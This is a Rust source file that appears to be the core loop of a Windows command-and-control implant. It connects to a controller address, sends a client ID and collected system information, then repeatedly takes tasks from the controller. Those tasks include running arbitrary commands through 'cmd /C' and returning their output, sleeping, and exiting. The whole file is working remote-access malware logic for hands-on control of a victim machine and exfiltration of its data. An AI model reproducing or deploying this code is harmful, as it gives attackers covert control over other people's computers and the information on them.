mod beacon;
pub mod collector;

use beacon::Task;
use std::net::SocketAddrV4;
use std::process::Command;

pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
    let mut beacon = beacon::Beacon::new(home)?;

    // sending client's ID
    beacon.initial_request()?;

    // sending collected system's info
    beacon.send_system_info()?;

    log::debug!("entering main program loop...");
    loop {
        match beacon.get_task()? {
            Task::Exec(cmd_bytes) => {
                let cmd = String::from_utf8_lossy(&cmd_bytes).to_string();

                let output = Command::new("cmd").args(&["/C", &cmd]).output();

                let result_bytes = match output {
                    Ok(out) => [out.stdout, out.stderr].concat(),
                    Err(e) => format!("failed to execute: {}", e).into_bytes(),
                };

                beacon.send_exec_result(result_bytes)?;
            }
            Task::Sleep(dur) => std::thread::sleep(dur),
            Task::Kill => std::process::exit(0),
            Task::Idle => continue,
        }
    }
}
